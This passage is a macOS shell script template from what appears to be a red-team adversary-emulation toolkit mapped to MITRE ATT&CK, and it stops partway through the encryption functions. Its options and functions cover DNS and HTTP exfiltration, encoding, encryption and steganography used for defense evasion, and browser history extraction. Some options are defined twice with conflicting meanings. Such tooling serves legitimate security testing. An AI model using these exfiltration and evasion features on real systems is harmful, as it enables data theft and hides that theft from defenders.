#!/bin/sh
# POSIX-compliant shell script - avoid bashisms
# Script Name: base.sh
# MITRE ATT&CK Technique: [TECHNIQUE_ID]
# Author: @darmado | https://x.com/darmad0
# Date: $(date '+%Y-%m-%d')
# Version: 1.0

# Description:
# This is a standalone base script template that can be used to build any technique.
# Replace this description with the actual technique description.
# The script uses native macOS commands and APIs for maximum compatibility.

#------------------------------------------------------------------------------
# Configuration Section
#------------------------------------------------------------------------------

# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with you coresponding tactic
TTP_ID="T1082" #replace with you coresponding ttp_id
SUBTECHNIQUE_ID=""

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
TACTIC_STEG="Defense Evasion" # DO NOT MODIFY
TTP_ID_STEG="T1027.013" # DO NOT MODIFY
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY

# Add a unique job ID for tracking
JOB_ID=$(openssl rand -hex 4)

# Script Information
NAME="base"
SCRIPT_CMD="$0 $*"
SCRIPT_STATUS="running"
OWNER="$USER"
PARENT_PROCESS="$(ps -p $PPID -o comm=)"

# Core Commands
CMD_BASE64="base64"
CMD_BASE64_OPTS=""  # macOS base64 doesn't use -w option
CMD_CURL="curl"
CMD_CURL_OPTS="-L -s -X POST"
CMD_CURL_SECURITY="--fail-with-body --insecure --location"
CMD_CURL_TIMEOUT="--connect-timeout 5 --max-time 10 --retry 1 --retry-delay 0"
CMD_DATE="date"
CMD_DATE_OPTS="+%Y-%m-%d %H:%M:%S"  # Fixed for macOS compatibility
CMD_DIG="dig"
CMD_DIG_OPTS="+short"
CMD_OPENSSL="openssl"
CMD_PRINTF="printf"
CMD_XXD="xxd"
CMD_PERL="perl"
CMD_PS="ps"
CMD_LOGGER="logger"
CMD_AWK="awk"
CMD_SED="sed"
CMD_GREP="grep"
CMD_TR="tr"
CMD_HEAD="head"
CMD_TAIL="tail"
CMD_SLEEP="sleep"
CMD_GPG="gpg"
CMD_GPG_OPTS="--batch --yes --symmetric --cipher-algo AES256 --armor"
CMD_STRINGS="strings"
CMD_HOST="host"
CMD_NSLOOKUP="nslookup"
CMD_HOSTNAME="hostname"
CMD_STAT="stat"

# Logging Settings
HOME_DIR="${HOME}"
LOG_DIR="./logs"  # Simple path to logs in current directory
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
LOG_ENABLED=false
SYSLOG_TAG="${NAME}"

# Default settings
VERBOSE=false
DEBUG=false
ALL=false
SHOW_HELP=false
LIST_FILES=false
STEG_TRANSFORM=false # Enable steganography transformation
STEG_CARRIER_IMAGE="" # Carrier image for steganography
STEG_OUTPUT_IMAGE="" # Output image for steganography
STEG_EXTRACT=false # Extract hidden data from steganography
STEG_EXTRACT_FILE="" # File to extract hidden data from
ALL=false
SAFARI=false
CHROME=false
FIREFOX=false
BRAVE=false

# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with your corresponding tactic
TTP_ID="T1082" #replace with your corresponding ttp_id
SUBTECHNIQUE_ID=""

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY

# Output Configuration
FORMAT=""          # json, csv, or empty for raw
JSON_WRAP_LINES=true # Whether to wrap each line in quotes in JSON
JSON_DETECT_NUMBERS=true # Try to detect numbers in JSON
ENCODE="none"      # base64, hex, perl_b64, perl_utf8
ENCRYPT="none"     # aes, gpg, none
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
EXFIL_START=""
EXFIL_END=""
CHUNK_SIZE=50      # Default chunk size for DNS exfiltration (bytes)
PROXY_URL=""       # Proxy URL for HTTP/HTTPS operations
ENCODING_TYPE="none"
ENCRYPTION_TYPE="none"
EXFIL_TYPE="none"

#------------------------------------------------------------------------------
# CORE FUNCTIONS FROM base.sh
#------------------------------------------------------------------------------
# NOTE: All core functions are prefixed with 'core_' to avoid namespace conflicts
# with script-specific functions. When creating scripts that source this file,
# use your own function names to prevent collisions.

# Purpose: Get the current timestamp in a consistent format
# Inputs: None
# Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
# Side Effects: None
core_get_timestamp() {
    # Use direct command to avoid variable expansion issues
    date "+%Y-%m-%d %H:%M:%S"
}

# Purpose: Print debug messages to stderr when debug mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stderr)
# Side Effects: Writes to stderr if DEBUG=true
core_debug_print() {
    if [ "$DEBUG" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[DEBUG] [%s] %s\n" "$timestamp" "$1" >&2
    fi
}

# Purpose: Print verbose messages to stdout when verbose mode is enabled
# Inputs: $1 - Message to print
# Outputs: None (prints directly to stdout)
# Side Effects: Writes to stdout if VERBOSE=true
core_verbose_print() {
    if [ "$VERBOSE" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[INFO] [%s] %s\n" "$timestamp" "$1"
    fi
}

# Purpose: Handle errors consistently with proper formatting and logging
# Inputs: $1 - Error message
# Outputs: None (prints directly to stderr)
# Side Effects: 
#   - Writes to stderr
#   - Logs error message if LOG_ENABLED=true
#   - Returns error code 1
core_handle_error() {
    local error_msg="$1"
    local timestamp=$(core_get_timestamp)
    $CMD_PRINTF "[ERROR] [%s] %s\n" "$timestamp" "$error_msg" >&2
    
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$error_msg" "error" false
    fi
    
    return 1
}

# Purpose: Log output to the log file with automatic rotation and consistent formatting
# Inputs: 
#   $1 - Output data to log
#   $2 - Status type (info, error, etc.), defaults to "info"
#   $3 - Skip data flag (true/false), defaults to false
# Outputs: None
# Side Effects:
#   - Creates log directory if it doesn't exist
#   - Writes to log file if LOG_ENABLED=true
#   - Rotates log file if size exceeds LOG_MAX_SIZE
#   - Writes to syslog with logger
#   - Writes to stdout if DEBUG or VERBOSE is true
core_log_output() {
    local output="$1"
    local status="${2:-info}"
    local skip_data="${3:-false}"
    
    if [ "$LOG_ENABLED" = true ]; then
        # Ensure log directory exists
        if [ ! -d "$LOG_DIR" ]; then
            mkdir -p "$LOG_DIR" 2>/dev/null || {
                $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                return 1
            }
        fi
        
        # Check log size and rotate if needed
        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ] && [ "$($CMD_STAT -f%z "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null || echo 0)" -gt "$LOG_MAX_SIZE" ]; then
            mv "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
            core_debug_print "Log file rotated due to size limit"
        fi
        
        # Log detailed entry
        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
            "$(core_get_timestamp)" \
            "$status" \
            "$$" \
            "${JOB_ID:-NOJOB}" \
            "$OWNER" \
            "$PARENT_PROCESS" \
            "$TTP_ID" \
            "$TACTIC" \
            "${FORMAT:-raw}" \
            "$ENCODING_TYPE" \
            "${ENCRYPTION_TYPE:-none}" \
            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
            
        if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
            "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
                "$SCRIPT_CMD" \
                "$output" >> "$LOG_DIR/$LOG_FILE_NAME"
        else
            "$CMD_PRINTF" "command: %s\\n---\\n" \
                "$SCRIPT_CMD" >> "$LOG_DIR/$LOG_FILE_NAME"
        fi

        # Also log to syslog
        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
    fi
    
    # Output to stdout if in debug/verbose mode
    if [ "$DEBUG" = true ] || [ "$VERBOSE" = true ]; then
        $CMD_PRINTF "[%s] [%s] %s\\n" "$(core_get_timestamp)" "$status" "$output"
    fi
}

# Purpose: Validate that required commands are available before script execution
# Inputs: None (uses global variables for command checks)
# Outputs: None
# Side Effects:
#   - Returns 1 if any required command is missing
#   - Calls core_handle_error on missing commands
core_validate_commands() {
    # POSIX-compliant approach using space-separated string
    local missing_cmds=""
    
    # Check for essential commands
    for cmd in "$CMD_DATE" "$CMD_PRINTF" "$CMD_OPENSSL"; do
        if ! command -v "$cmd" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $cmd"
        fi
    done
    
    # Check encryption/encoding commands if needed
    if [ "$ENCODE" != "none" ]; then
        if [ "$ENCODE" = "base64" ] && ! command -v "$CMD_BASE64" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_BASE64"
        elif [ "$ENCODE" = "hex" ] && ! command -v "$CMD_XXD" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_XXD"
        elif echo "$ENCODE" | grep "^perl" > /dev/null && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_PERL"
        fi
    fi
    
    # Check if perl is needed for XOR encryption
    if [ "$ENCRYPT" = "xor" ] && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
        missing_cmds="$missing_cmds $CMD_PERL"
    fi
    
    # Check exfiltration commands if needed
    if [ "$EXFIL" = true ]; then
        case "$EXFIL_METHOD" in
            http|https)
                if ! command -v "$CMD_CURL" > /dev/null 2>&1; then
                    missing_cmds="$missing_cmds $CMD_CURL"
                fi
                ;;
            dns)
                if ! command -v "dig" > /dev/null 2>&1; then
                    missing_cmds="$missing_cmds dig"
                fi
                ;;
        esac
    fi
    
    # Report missing commands
    if [ -n "$missing_cmds" ]; then
        core_handle_error "Missing required commands:$missing_cmds"
        return 1
    fi
    
    return 0
}

# Purpose: Check if a domain resolves to a valid IP address
# Inputs: $1 - Domain to check
# Outputs: 0 if domain resolves, 1 if not
# Side Effects: Prints error message if domain doesn't resolve
core_validate_domain() {
    local domain="$1"
    
    # Skip empty domains
    [ -z "$domain" ] && return 0
    
    # Skip IP addresses
    if echo "$domain" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' > /dev/null; then
        return 0
    fi
    
    # Check for response with an actual IP address
    local resolved=""
    
    if command -v "$CMD_DIG" > /dev/null 2>&1; then
        resolved=$($CMD_DIG $CMD_DIG_OPTS "$domain" A 2>/dev/null)
        if [ -n "$resolved" ]; then
            return 0
        fi
    elif command -v "$CMD_HOST" > /dev/null 2>&1; then
        resolved=$($CMD_HOST "$domain" 2>/dev/null | $CMD_GREP "has address" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    elif command -v "$CMD_NSLOOKUP" > /dev/null 2>&1; then
        resolved=$($CMD_NSLOOKUP "$domain" 2>/dev/null | $CMD_GREP "Address:" | $CMD_GREP -v "#53" | $CMD_HEAD -1)
        if [ -n "$resolved" ]; then
            return 0
        fi
    else
        # If no DNS tools are available, assume the domain resolves
        # This is a fallback behavior
        return 0
    fi
    
    
    core_handle_error "Domain does not resolve: $domain"
    return 1
}

# Purpose: Parse and validate command-line arguments, setting global flags accordingly
# Inputs: $@ - All command-line arguments passed to the script
# Outputs: None
# Side Effects:
#   - Sets global flag variables based on command-line options
#   - Validates argument combinations
#   - Generates encryption key if encryption is enabled
#   - Exits script on invalid argument combinations
core_parse_arguments() {
    while [ "$#" -gt 0 ]; do
        case "$1" in
            -h|--help)
                SHOW_HELP=true
                ;;
            -v|--verbose)
                VERBOSE=true
                ;;
            -d|--debug)
                DEBUG=true
                VERBOSE=true
                ;;
            -a|--all)
                ALL=true
                ;;
            -l|--log)
                LOG_ENABLED=true
                ;;
            --ls)
                # Mark that we want to use the ls function
                LIST_FILES=true
                ;;
            -f|--format|--output-format)
                if [ -n "$2" ]; then
                    FORMAT="$2"
                    shift
                fi
                ;;
            --encode)
                if [ -n "$2" ]; then
                    ENCODE="$2"
                    ENCODING_TYPE="$2"
                    shift
                fi
                ;;
            --encrypt)
                if [ -n "$2" ]; then
                    ENCRYPT="$2"
                    ENCRYPTION_TYPE="$2"
                    shift
                fi
                ;;
            --exfil-dns)
                if [ -n "$2" ]; then
                    # Pass domain directly to validation function
                    local domain="$2"
                    if core_validate_domain "$domain"; then
                        EXFIL=true
                        EXFIL_METHOD="dns"
                        EXFIL_TYPE="dns"
                        EXFIL_URI="$2"
                    else
                        exit 1
                    fi
                    shift
                fi
                ;;
            --exfil-http)
                if [ -n "$2" ]; then
                    # Get the domain part to validate
                    local uri="$2"
                    local domain=$("$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~')
                    
                    # Pass to domain validation function
                    if core_validate_domain "$domain"; then
                        EXFIL=true
                        EXFIL_METHOD="http"
                        EXFIL_TYPE="http"
                        EXFIL_URI="$2"
                    else
                        exit 1
                    fi
                    shift
                fi
                ;;
            # Support for legacy --exfil-uri parameter
            --exfil-uri)
                if [ -n "$2" ]; then
                    # Extract domain and check if it resolves
                    local uri="$2"
                    local domain=$("$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~')
                    
                    if [ "$domain" = "$uri" ]; then
                        # No protocol, assume it's a domain for DNS
                        if core_validate_domain "$domain"; then
                            EXFIL=true
                            EXFIL_METHOD="dns"
                            EXFIL_TYPE="uri"
                            EXFIL_URI="$2"
                        else
                            exit 1
                        fi
                    else
                        # Has protocol, treat as HTTP URI
                        if core_validate_domain "$domain"; then
                            EXFIL=true
                            EXFIL_METHOD="http"
                            EXFIL_TYPE="uri"
                            EXFIL_URI="$2"
                        else
                            exit 1
                        fi
                    fi
                    shift
                fi
                ;;
            --chunk-size)
                if [ -n "$2" ] && [ "$2" -gt 0 ] 2>/dev/null; then
                    CHUNK_SIZE="$2"
                    shift
                else
                    core_handle_error "Invalid chunk size: $2. Must be a positive integer."
                    exit 1
                fi
                ;;
            --proxy)
                if [ -n "$2" ]; then
                    PROXY_URL="$2"
                    shift
                fi
                ;;
            --exfil-method)
                if [ -n "$2" ]; then
                    EXFIL_METHOD="$2"
                    EXFIL_TYPE="$2"
                    shift
                fi
                ;;
            --steganography)
                STEG_TRANSFORM=true
                ;;
            --steg-message)
                if [ -n "$2" ]; then
                    STEG_MESSAGE="$2"
                    shift
                fi
                ;;
            --steg-input)
                if [ -n "$2" ]; then
                    STEG_EXTRACT_FILE="$2"
                    shift
                fi
                ;;
            --steg-carrier)
                if [ -n "$2" ]; then
                    STEG_CARRIER_IMAGE="$2"
                    shift
                fi
                ;;
            --steg-output)
                if [ -n "$2" ]; then
                    STEG_OUTPUT_IMAGE="$2"
                    shift
                fi
                ;;
            --steg-extract)
                STEG_EXTRACT=true
                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
                    # If the next arg starts with -, it's another option
                    STEG_EXTRACT_FILE="./hidden_data.png"
                elif [ -n "$2" ]; then
                    # Otherwise it's the file to extract from
                    STEG_EXTRACT_FILE="$2"
                    shift
                else
                    # Default if no file specified
                    STEG_EXTRACT_FILE="./hidden_data.png"
                fi
                ;;
            -a|--all)
                ALL=true
                shift
                ;;
            -s|--safari)
                SAFARI=true
                shift
                ;;
            -c|--chrome)
                CHROME=true
                shift
                ;;
            -f|--firefox)
                FIREFOX=true
                shift
                ;;
            -b|--brave)
                BRAVE=true
                shift
                ;;
            --search)
                ;;
            --last)
                ;;
            --starttime)
                ;;
            --endtime)
                ;;
            *)
                # Ignore unknown arguments
                ;;
        esac
        shift
    done
    
    # Validate argument combinations
    if [ "$EXFIL" = true ] && [ -z "$EXFIL_METHOD" ]; then
        core_handle_error "Exfiltration enabled but no method specified"
        exit 1
    fi
    
    # Generate a key if encryption is enabled
    if [ "$ENCRYPT" != "none" ]; then
        # Generate encryption key silently
        ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
        if [ "$DEBUG" = true ]; then
            $CMD_PRINTF "[DEBUG] [%s] Using encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
        fi
    fi
    
    core_debug_print "Arguments parsed: VERBOSE=$VERBOSE, DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
}

# Display help message
core_display_help() {
    cat << EOF
Usage: ${0##*/} [OPTIONS]

Description: Base script for ATT&CK macOS techniques
MITRE ATT&CK: ${TTP_ID} - ${TACTIC}

Basic Options:
  -h, --help           Display this help message
  -v, --verbose        Enable verbose output with execution details
  -d, --debug          Enable debug output (includes verbose output)
  -a, --all            Process all available data (technique-specific)
  -l, --log            Enable logging to file (logs stored in $LOG_DIR)
  --ls                 List files in the current directory
  --steganography        Transform output using steganography (hide in image file)
  --steg-message TEXT    Text message to hide (used when --steg-input not specified)
  --steg-input FILE      File containing data to hide
  --steg-carrier FILE    Carrier image file (default: system desktop picture)
  --steg-output FILE     Output image file (default: ./hidden_data.png)
  --steg-extract [FILE]  Extract hidden data from steganography image (default: ./hidden_data.png)
  -a|--all             Extract history from all browsers
  -s|--safari          Extract Safari history
  -c|--chrome          Extract Chrome history
  -f|--firefox         Extract Firefox history
  -b|--brave           Extract Brave history
  --search             Search for specific terms in history
  --last               Last N days to search
  --starttime          Start time in YY-MM-DD HH:MM:SS format
  --endtime            End time in YY-MM-DD HH:MM:SS format

Output Options:
  -f, --format TYPE    Output format: 
                        - json: Structured JSON output
                        - csv: Comma-separated values
                        - raw: Default pipe-delimited text

Encoding Options:
  --encode TYPE        Encode output using:
                        - base64/b64: Base64 encoding
                        - hex/xxd: Hexadecimal encoding
                        - perl_b64: Perl Base64 implementation
                        - perl_utf8: Perl UTF8 encoding

Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption (key sent via DNS)
                        - gpg: GPG symmetric encryption (key sent via DNS)
                        - xor: XOR encryption with cyclic key

Exfiltration Options:
  --exfil-dns DOMAIN   Exfiltrate data via DNS queries to specified domain
                        Data is automatically base64 encoded and chunked
  --exfil-http URL     Exfiltrate data via HTTP POST to specified URL
                        Data is sent in the request body
  --exfil-uri URL      Legacy parameter - Exfiltrate via HTTP GET with URL params
                        Data is automatically chunked to avoid URL length limits
  --chunk-size SIZE    Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
  --proxy URL          Use proxy for HTTP requests (format: protocol://host:port)
  --exfil-method METHOD Exfiltrate data using specified method


Notes:
- When using encryption with exfiltration, keys are automatically sent via DNS TXT records
- JSON output includes metadata about execution context
- Log files are automatically rotated when they exceed ${LOG_MAX_SIZE} bytes
- Exfiltration is enabled automatically when specifying any exfil method
- DNS exfiltration automatically chunks data and sends start/end signals
EOF
}

# Purpose: Process raw output according to format, encoding, and encryption settings
# Inputs:
#   $1 - Raw output data to process
#   $2 - Data source identifier (defaults to "generic")
# Outputs: Processed output (formatted/encoded/encrypted as requested)
# Side Effects:
#   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
core_process_output() {
    local output="$1"
    local data_source="${2:-generic}"
    local processed="$output"
    local is_encoded=false
    local is_encrypted=false
    local is_steganography=false
    
    # 1. Format the output first if requested
    if [ -n "$FORMAT" ]; then
        if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
            # For JSON, only use raw data here - we'll add transformation metadata at the end
            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
        else
            # For other formats, just format the raw output
            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
        fi
        core_debug_print "Output formatted as $FORMAT"
    fi
    
    # 2. Apply encoding if requested (after formatting)
    if [ "$ENCODE" != "none" ]; then
        core_debug_print "Applying encoding: $ENCODE"
        processed=$(core_encode_output "$processed" "$ENCODE")
        is_encoded=true
    fi
    
    # 3. Apply encryption if requested (after encoding)
    if [ "$ENCRYPT" != "none" ]; then
        core_debug_print "Applying encryption: $ENCRYPT"
        processed=$(core_encrypt_output "$processed" "$ENCRYPT")
        is_encrypted=true
    fi
    
    # 4. Apply steganography if requested (after encryption)
    if [ "$STEG_TRANSFORM" = true ]; then
        core_debug_print "Applying steganography transformation"
        # Save the processed data to the steganography image
        local steg_result=$(core_apply_steganography "$processed")
        # Only set the output metadata, the actual file is written directly
        processed="$steg_result"
        is_steganography=true
    fi
    
    # 5. If JSON formatting was requested, add the final metadata about transformations
    if [ -n "$FORMAT" ] && [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
        # We already formatted the output, but add the transformation metadata
        if [ "$is_encoded" = true ] || [ "$is_encrypted" = true ] || [ "$is_steganography" = true ]; then
            # Don't double-wrap in JSON, just return the processed data with transformation flags
            # The metadata about transformations is informational only for the user
            core_debug_print "Preserving encoded/encrypted data in output"
        fi
    fi
    
    $CMD_PRINTF "%s" "$processed"
}

# Purpose: Format output based on requested format (JSON, CSV, etc.)
# Inputs:
#   $1 - Output data to format
#   $2 - Format type (json, csv, or other for raw)
#   $3 - Data source identifier (defaults to "generic")
#   $4-7 - Additional parameters for JSON metadata
# Outputs: Formatted data
# Side Effects: None
core_format_output() {
    local output="$1"
    local format="$2"
    # Convert to lowercase using tr for sh compatibility
    format=$(echo "$format" | tr '[:upper:]' '[:lower:]')
    local data_source="${3:-generic}"
    local is_encoded="${4:-false}"
    local encoding="${5:-none}"
    local is_encrypted="${6:-false}"
    local encryption="${7:-none}"
    local is_steganography="${8:-false}"
    local formatted="$output"
    
    case "$format" in
        json|json-lines)
            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
            ;;
        csv)
            formatted=$(core_format_as_csv "$output")
            ;;
        *)
            # Keep as raw
            ;;
    esac
    
    $CMD_PRINTF "%s" "$formatted"
}

# Purpose: Convert output data to JSON format with metadata
# Inputs:
#   $1 - Output data to convert to JSON
#   $2 - Data source identifier
#   $3 - Whether data is encoded (true/false)
#   $4 - Encoding method
#   $5 - Whether data is encrypted (true/false)
#   $6 - Encryption method
#   $7 - Whether steganography is used (true/false)
# Outputs: JSON-formatted string with data and metadata
# Side Effects: None
core_format_as_json() {
    local output="$1"
    local data_source="${2:-generic}"
    local is_encoded="${3:-false}"
    local encoding="${4:-none}"
    local is_encrypted="${5:-false}"
    local encryption="${6:-none}"
    local is_steganography="${7:-false}"
    local json_output=""
    local timestamp=$(core_get_timestamp)
    
    # Create JSON structure - POSIX-compliant approach with direct string concatenation
    json_output="{"
    json_output="$json_output
  \"timestamp\": \"$timestamp\","
    json_output="$json_output
  \"command\": \"$SCRIPT_CMD\","
    json_output="$json_output
  \"jobId\": \"$JOB_ID\","
    json_output="$json_output
  \"dataSource\": \"$data_source\","
    
    # Always include encoding and encryption status
        json_output="$json_output
  \"encoding\": {"
    json_output="$json_output
    \"enabled\": $is_encoded,"
    json_output="$json_output
    \"method\": \"$encoding\"
  },"
    
        json_output="$json_output
  \"encryption\": {"
    json_output="$json_output
    \"enabled\": $is_encrypted,"
    json_output="$json_output
    \"method\": \"$encryption\"
  },"
  
    # Include steganography status
    json_output="$json_output
  \"steganography\": {"
    json_output="$json_output
    \"enabled\": $is_steganography,"
    if [ "$is_steganography" = true ] && [ -n "$STEG_OUTPUT_IMAGE" ]; then
        json_output="$json_output
    \"output\": \"$STEG_OUTPUT_IMAGE\""
    else
        json_output="$json_output
    \"output\": null"
    fi
    json_output="$json_output
  },"
    
    json_output="$json_output
  \"data\": ["
    
    # Process each line
    local line_count=0
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Add comma if not first line
        if [ $line_count -gt 0 ]; then
            json_output="$json_output,"
        fi
        
        # Escape special characters
        line=$(echo "$line" | sed 's/\\/\\\\/g; s/"/\\"/g')
        
        # Check if line is a number and JSON_DETECT_NUMBERS is true
        if [ "$JSON_DETECT_NUMBERS" = true ] && echo "$line" | grep -E '^[0-9]+$' > /dev/null; then
            json_output="$json_output
      $line"
        else
            # Wrap in quotes for string
            json_output="$json_output
      \"$line\""
        fi
        
        line_count=$((line_count + 1))
    done <<< "$output"
    
    # Close JSON structure
    json_output="$json_output
    ]
}"
    
    # Output the JSON string directly
    $CMD_PRINTF "%s" "$json_output"
}

# Convert pipe-delimited output to CSV format
core_format_as_csv() {
    local output="$1"
    local csv_output=""
    
    # Process each line
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Replace pipe delimiters with commas
        csv_line=$(echo "$line" | sed 's/|/,/g')
        
        # Add to CSV output
        if [ -z "$csv_output" ]; then
            csv_output="$csv_line"
        else
            csv_output="${csv_output}\n$csv_line"
        fi
    done <<< "$output"
    
    # Output CSV directly
    $CMD_PRINTF "%s" "$csv_output"
}

# Purpose: Encode output using the specified encoding method
# Inputs:
#   $1 - Output data to encode
#   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
# Outputs: Encoded data according to specified method
# Side Effects: None
core_encode_output() {
    local output="$1"
    local encode_type="$2"
    # Convert to lowercase using tr for sh compatibility
    encode_type=$("$CMD_PRINTF" '%s' "$encode_type" | tr '[:upper:]' '[:lower:]')
    local encoded=""
    
    case "$encode_type" in
        base64|b64)
            # Debug information
            core_debug_print "Encoding with base64"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_BASE64)
            ;;
        hex)
            core_debug_print "Encoding with hex"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            ;;
        perl_b64)
            core_debug_print "Encoding with perl base64"
            if command -v perl > /dev/null 2>&1; then
                encoded=$("$CMD_PRINTF" '%s' "$output" | perl -MMIME::Base64 -e 'print encode_base64(<STDIN>);')
            else
                core_debug_print "Perl not found, falling back to standard base64"
                encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_BASE64)
            fi
            ;;
        perl_utf8)
            core_debug_print "Encoding with perl utf8"
            if command -v perl > /dev/null 2>&1; then
                encoded=$("$CMD_PRINTF" '%s' "$output" | perl -e 'while (read STDIN, $buf, 1024) { print unpack("H*", $buf); }')
            else
                core_debug_print "Perl not found, falling back to hex encoding"
                encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            fi
            ;;
        *)
            # Return unmodified if unknown encoding type
            core_debug_print "Unknown encoding type: $encode_type - using raw"
            encoded="$output"
            ;;
    esac
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Main encryption function that determines which specific encryption method to use
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption method (none|aes|gpg|xor)
#   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
# Outputs: Encrypted data or original data if no encryption
# Side Effects: None (delegated to specific encryption functions)
core_encrypt_output() {
    local data="$1"
    local method="$2"
    local key="${3:-$ENCRYPT_KEY}"
    
    # Convert to lowercase using tr for sh compatibility
    method=$("$CMD_PRINTF" '%s' "$method" | tr '[:upper:]' '[:lower:]')
    
    case "$method" in
        "none")
            # No encryption, just return the original data
            core_debug_print "No encryption requested, returning raw data"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
        "aes")
            # Use AES encryption method
            core_debug_print "Using AES encryption method"
            encrypt_with_aes "$data" "$key"
            return $?
            ;;
        "gpg")
            # Use GPG encryption method
            core_debug_print "Using GPG encryption method"
            encrypt_with_gpg "$data" "$key"
            return $?
            ;;
        "xor")
            # Use XOR encryption method
            core_debug_print "Using XOR encryption method"
            encrypt_with_xor "$data" "$key"
            return $?
            ;;
        *)
            # Invalid encryption method
            core_debug_print "Unknown encryption type: $method - using raw"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
    esac
}

# Purpose: Encrypt data using AES-256-CBC with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: AES-256-CBC encrypted data in base64 format
# Side Effects:
#   - Sets global ENCRYPTION_TYPE to "aes" on success
#   - Writes error message to stderr on failure
encrypt_with_aes() {
    local data="$1"
    local key="$2"
    
    # Use global command variable with AES-256-CBC
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_OPENSSL enc -aes-256-cbc -base64 -k "$key" 2>/dev/null)
    if [ $? -eq 0 ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="aes"
        core_debug_print "AES encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "AES encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with AES\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using GPG symmetric encryption with specified key
# Inputs:
